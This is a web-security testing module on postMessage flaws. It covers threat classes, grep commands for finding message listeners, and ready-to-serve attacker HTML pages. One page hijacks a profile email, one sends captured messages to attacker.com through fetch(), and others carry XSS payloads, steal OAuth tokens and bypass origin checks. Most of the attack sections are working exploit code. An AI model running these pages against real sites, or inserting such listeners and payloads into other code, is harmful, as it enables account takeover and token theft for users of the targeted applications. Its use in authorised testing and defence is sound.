# VULN MODULE — postMessage / Cross-Frame Messaging
# Asset: webapp (web applications using iframe communication)
# See also: asset/chromeext/vuln/postmessage.md for extension-specific variant
# Report ID prefix: WEB-PM

## THREAT MODEL

postMessage() is the browser's cross-origin communication API.
When origin validation is missing or incorrect, attacker pages can:
  - Send malicious messages to trusted frames (write-side attack)
  - Listen to sensitive messages from trusted frames (read-side attack)
  - Trigger sensitive actions in embedded iframes (CSRF-equivalent)
  - Extract secrets from postMessage data (token theft)

Common patterns that introduce this vulnerability:
  - Payment iframes (Stripe, PayPal embeds)
  - OAuth popup flows
  - Embedded widgets (chat, maps, analytics)
  - Single-page apps with iframe micro-frontends
  - Browser extension ↔ page communication

## VULNERABILITY CLASSES

1. Missing origin check → sensitive action    CWE-346  — High/Critical
2. Wildcard origin in postMessage send        CWE-346  — Medium/High
3. Sensitive data in postMessage payload      CWE-200  — Medium/High
4. postMessage → eval / innerHTML sink        CWE-79   — High (XSS)
5. Clickjacking-assisted postMessage abuse    CWE-1021 — Medium

## WHITEBOX STATIC ANALYSIS

```bash
# All message event listeners — the attack surface
grep -rn "addEventListener.*['\"]message['\"]" --include="*.js" --include="*.ts"
grep -rn "window\.onmessage\b" --include="*.js" --include="*.ts"

# Origin validation (or lack thereof)
grep -rn "event\.origin\|message\.origin" --include="*.js" --include="*.ts"
# For EVERY message listener found above:
# Check: is event.origin validated BEFORE processing event.data?
# Flag any listener that processes data WITHOUT checking origin first

# Dangerous sinks fed by message data
grep -rn "event\.data\b" --include="*.js" --include="*.ts" -A3
# Check: does event.data flow into innerHTML, eval, location.href, fetch()?

# postMessage sends with wildcard origin (data leakage)
grep -rn "postMessage.*['\"][*]['\"]" --include="*.js" --include="*.ts"
# Any postMessage(sensitiveData, "*") is a finding

# React / framework-specific
grep -rn "useEffect.*message\|\.on.*message" --include="*.js" --include="*.ts" --include="*.jsx" --include="*.tsx"
```

## BLACKBOX TESTING

### Step 1 — Enumerate message handlers
```javascript
// Inject into target page via browser console or proxy-injected script
// Monitor ALL incoming message events
const orig = window.addEventListener.bind(window);
window.addEventListener = function(type, handler, ...args) {
  if (type === 'message') {
    const wrapped = function(e) {
      console.log('[postMessage IN]', {
        origin: e.origin,
        data: e.data,
        source: e.source
      });
      return handler.call(this, e, ...args);
    };
    return orig(type, wrapped, ...args);
  }
  return orig(type, handler, ...args);
};
// Then interact with the app and observe logged messages
```

### Step 2 — Test missing origin check (write attack)
```html
<!-- attacker.html — serve on a different origin -->
<!DOCTYPE html>
<html>
<body>
<script>
const TARGET = 'https://target.com';

// Open target in iframe
const frame = document.createElement('iframe');
frame.src = TARGET + '/dashboard';
document.body.appendChild(frame);

frame.onload = () => {
  // Send crafted message — replace type/action with values from static analysis
  frame.contentWindow.postMessage({
    type: 'SET_CONFIG',        // observed message type
    action: 'updateProfile',
    data: { email: 'attacker@evil.com' }
  }, '*');                     // wildcard = no origin restriction on sender side

  // Also try string-based messages
  frame.contentWindow.postMessage('{"type":"navigate","url":"javascript:alert(1)"}', '*');
};
</script>
</body>
</html>
```

### Step 3 — Test data leakage (read attack)
```html
<!-- Listen for any messages sent with wildcard origin from target -->
<!DOCTYPE html>
<html>
<body>
<script>
window.addEventListener('message', (e) => {
  console.log('[RECEIVED from ' + e.origin + ']', e.data);
  // Exfiltrate to attacker server
  fetch('https://attacker.com/log?data=' + encodeURIComponent(JSON.stringify({
    origin: e.origin,
    data: e.data
  })));
});

// Open target in popup (some apps use popups for OAuth)
window.open('https://target.com/oauth/callback', 'popup', 'width=500,height=600');
</script>
</body>
</html>
```

### Step 4 — postMessage → XSS via DOM sink
```javascript
// If event.data feeds into innerHTML without sanitization:
frame.contentWindow.postMessage({
  template: '<img src=x onerror="alert(document.domain)">',
  html: '<script>alert(document.domain)<\/script>'
}, '*');
```

### Step 5 — OAuth token theft via postMessage
```html
<!-- Some OAuth flows send tokens via postMessage to the opener -->
<!DOCTYPE html>
<html>
<body>
<script>
window.addEventListener('message', (e) => {
  if (e.data && (e.data.token || e.data.access_token || e.data.code)) {
    console.log('[OAuth token received]', e.data);
    // Token stolen — now use it
  }
});
// Initiate OAuth flow — target will postMessage the token back to window.opener
window.open('https://target.com/auth/start?redirect_uri=https://attacker.com', '_blank');
</script>
</body>
</html>
```

## ORIGIN VALIDATION BYPASS PATTERNS

Even when origin IS checked, these bypasses are worth testing:

```javascript
// Bypass 1: startsWith check
// Vulnerable: if (event.origin.startsWith('https://trusted.com'))
// Bypass: use https://trusted.com.attacker.com

// Bypass 2: includes check
// Vulnerable: if (event.origin.includes('trusted.com'))
// Bypass: use https://attacker.com?x=trusted.com or https://trusted.com.evil.com

// Bypass 3: null origin (sandboxed iframe)
// Some handlers accept null origin:
// if (event.origin === null || event.origin === 'https://trusted.com')
// Bypass: send from sandboxed iframe: <iframe sandbox="allow-scripts" srcdoc="...">

// Bypass 4: regex without anchors
// Vulnerable: if (/trusted\.com/.test(event.origin))
// Bypass: https://attacker.com?trusted.com
```
